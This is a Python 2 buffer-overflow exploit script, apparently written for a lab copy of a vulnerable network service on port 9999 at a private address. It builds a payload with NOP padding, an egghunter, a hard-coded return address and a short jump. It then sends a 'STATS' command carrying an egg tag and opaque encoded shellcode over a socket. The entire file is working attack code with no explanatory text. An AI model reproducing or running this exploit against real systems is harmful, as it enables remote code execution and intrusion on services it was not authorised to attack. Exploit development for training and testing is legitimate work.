#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs
import socket
import os
import time

host = "192.168.1.149"
port = 9999

def c(x):
  return pack('<L', x)

def pc(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def junk(size):
	return "\x90"*size

shellcode = ("\xdb\xc5\xd9\x74\x24\xf4\xb8\x92\xd8\x77\xcc\x5e\x31\xc9\xb1"
"\x31\x31\x46\x18\x03\x46\x18\x83\xc6\x96\x3a\x82\x30\x7e\x38"
"\x6d\xc9\x7e\x5d\xe7\x2c\x4f\x5d\x93\x25\xff\x6d\xd7\x68\xf3"
"\x06\xb5\x98\x80\x6b\x12\xae\x21\xc1\x44\x81\xb2\x7a\xb4\x80"
"\x30\x81\xe9\x62\x09\x4a\xfc\x63\x4e\xb7\x0d\x31\x07\xb3\xa0"
"\xa6\x2c\x89\x78\x4c\x7e\x1f\xf9\xb1\x36\x1e\x28\x64\x4d\x79"
"\xea\x86\x82\xf1\xa3\x90\xc7\x3c\x7d\x2a\x33\xca\x7c\xfa\x0a"
"\x33\xd2\xc3\xa3\xc6\x2a\x03\x03\x39\x59\x7d\x70\xc4\x5a\xba"
"\x0b\x12\xee\x59\xab\xd1\x48\x86\x4a\x35\x0e\x4d\x40\xf2\x44"
"\x09\x44\x05\x88\x21\x70\x8e\x2f\xe6\xf1\xd4\x0b\x22\x5a\x8e"
"\x32\x73\x06\x61\x4a\x63\xe9\xde\xee\xef\x07\x0a\x83\xad\x4d"
"\xcd\x11\xc8\x23\xcd\x29\xd3\x13\xa6\x18\x58\xfc\xb1\xa4\x8b"
"\xb9\x5e\x47\x1e\xb7\xf6\xde\xcb\x7a\x9b\xe0\x21\xb8\xa2\x62"
"\xc0\x40\x51\x7a\xa1\x45\x1d\x3c\x59\x37\x0e\xa9\x5d\xe4\x2f"
"\xf8\x3d\x6b\xbc\x60\xec\x0e\x44\x02\xf0")

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x61\x70\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
egg = "CaptCapt"
exploit = ""
buffsize = 1400
EIP = 115
ESP = 119

exploit += junk(18)
exploit += egghunter
exploit += junk(EIP-len(exploit))
exploit += c(0x625011af)
exploit += junk(8)
exploit += "\xCE\xEB\x90\x90"
exploit += junk(buffsize-len(exploit))

print len(exploit)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
shell = "STATS " + egg + shellcode 
s.send(shell)
s.close()